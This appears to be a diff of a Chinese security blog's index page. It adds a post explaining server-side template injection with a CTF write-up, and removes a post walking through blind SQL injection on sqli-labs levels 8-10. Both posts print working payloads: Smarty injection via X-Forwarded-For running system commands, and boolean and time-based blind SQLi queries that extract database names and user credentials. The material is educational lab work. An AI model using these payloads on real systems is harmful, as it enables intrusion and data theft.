@@ -169,6 +169,92 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-ssti" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/06/ssti/" class="article-date">
+  	<time datetime="2021-04-06T07:53:13.000Z" itemprop="datePublished">2021-04-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/06/ssti/">
+        SSTI注入&amp;&amp;[BJDCTF2020]The mystery of ip 1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-知识点">#知识点</h2>
+<p><strong>SSTI模板注入：</strong><br>
+
+</p><p><img src="/2021/04/06/ssti/1.png"></p>
+<p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
+<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
+<h2 id="#模板引擎">01模板引擎</h2>
+<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig</p>
+<pre><code>
+模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。
+</code></pre>
+<h2 id="#模板渲染">02 模板渲染</h2>
+<p>首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。<br>
+通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
+<h2 id="#服务端模版注入">03 服务端模版注入</h2>
+<p>服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
+<pre><code>这里模板注入前加“服务端”，这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。
+</code></pre>
+<h2 id="#模板引擎注入">04 模板引擎注入</h2>
+<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。重点来了，不同引擎有不同的测试以及注入方式！</p>
+<p><strong>flask/jinja2模板注入</strong></p>
+<p><strong>PHP/模版引擎Twig注入</strong></p>
+<h2 id="#tplmap">05 tplmap</h2>
+<p>利用tplmap这个工具进行检测是否有模板注入漏洞，用法有点像sqlmap,都是基于python的。</p>
+<h2>06 题目</h2>
+
+<p>查看源码：<br><img src="/2021/04/06/ssti/2.png"><br>发现里面有flag.php文件，打开后界面如下:<br><img src="/2021/04/06/ssti/3.png"><br>存在ip地址，bp抓包，执行如下payload（smarty模板注入）：</p>
+<pre><code>X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
+X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
+</code></pre>
+<p>得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-daima" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1244,133 +1330,9 @@ object:o:strlen(object name):object name:object size:{s:strlen(property name):pr
 
 
   
-    <article id="post-mz" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/02/26/mz/" class="article-date">
-  	<time datetime="2021-02-26T05:52:18.000Z" itemprop="datePublished">2021-02-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/26/mz/">
-        sqli-labs靶场8-10
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>知识点</h1>
-
-<p>函数</p>
-<ul>
-<li>length()函数                返回字段/结果/函数的长度，length(column_name)
-</li><li>length(database())            即返回当前数据库名长度
-</li><li>substr()函数             截取字符段长度
-</li><li>例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a
-</li><li>  substr（abcd，2，1）     从第二位开始，截取一个字符，就是b
-</li><li>substr（abcd，2，3）       从第二位开始，截取三个字符，就是bcd
-</li><li>if()函数                条件判断函数
-</li><li>if(a,b,c)      if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;
-</li><li>sleep()函数            网页延迟n秒后，输出结果
-</li><li>left（）函数             从左边数，取几个数
-</li><li>例如：left（abcdef，3）  取3位左边的数，就是abc
-</li></ul>
-
-<p><img src="/2021/02/26/mz/b1.png"></p>
-<h1>Less-8（基于布尔的盲注）</h1>
-
-<p><b style="color:pink">基于布尔的盲注：</b><br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);<br>if($row){<br>      echo ‘You are in………..’;<br>}else{<br>}<br><b style="color:pink">payload:</b></p>
-<ol>
-<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+
-</li><li>Less-8/?id=1' and (length(database())) = 8 --+ //数库名长度=8
-</li></ol>
-
-<p><b style="color:pink">盲注得到数据库名：security</b></p>
-<ol>
-<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,3,1))) = 99 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,4,1))) = 117 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,5,1))) = 114 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,6,1))) = 105 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,7,1))) = 116 --+
-</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,8,1))) = 121 --+  
-</li></ol>
-
-<p><b style="color:pink">接着判断表名长度：</b><br>Less-8/?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 –+<br><b style="color:pink">接下来判断表名为user：</b><br>?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) = 5 –+</p>
-<ol>
-<li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+
-
-</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,2,1))) = 115 --+
-
-</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,3,1))) = 101 --+
-
-</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,4,1))) = 114 --+
-
-</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,5,1))) = 115 --+
-</li></ol>
-
-<p>其余的用同样的盲注方法得到结果</p>
-<h1>Less-9（基于时间盲注1）</h1>
-
-<p><b style="color:purple">一、判断注入点</b><br>?id=1’)and (sleep(4)) –+ （耗时2s，这是正常的页面，没有闭合的页面）<br>?id=1’and (sleep(4)) –+ （耗时6s，因为正常页面需要2s，所以闭合之后消耗的时间为又增加了4s，所以是6s）<br>时间注入判断注入点就用这个<br>由于不报错，所以判断注入点，就是用sleep延迟函数<br>根据第8关的思想我们先判断数据库的长度</p>
-<ul>
-<li>?id=1' and if (length(database()) = 8 ,sleep(4),1)--+
-</li></ul>
-
-<p>数据库的长度为8，就延时反应4秒<br>知道了数据库的长度，那么我们就进行爆库;<br>?id=1’ and If(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>说明第一位是 s （ascii 码是 115）<br>?id=1’ and If(ascii(substr(database(),2,1))=101,sleep(5),1)–+<br>说明第一位是 e （ascii 码是 101）<br><b style="color:purple">二、爆表名</b><br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(4),1)–+ （u）<br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),2,1))=115,sleep(4),1)–+ （s）<br>以此类推<br>————————————————<br>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,sleep(4),1)–+</p>
-<p>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br><b style="color:purple">三、爆数据</b><br>?id=1’ and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(4),1)–+<br>以此类推，我们得到数据库 username，password 的所有内容</p>
-<h1>Less-10（基于时间盲注2）</h1>
-
-<p>和第九关一样，基于时间盲注的注入<br>双引号注入：<br>系统的来判断一下注入点</p>
-<ul>
-<li>?id=1" and (sleep(3))--+  （有延迟）
-</li><li>?id=1’ and (sleep(3))--+   (无延迟)
-</li></ul>
-
-<p>接下来和第九关步骤一样，得到想要的内容</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 </div>
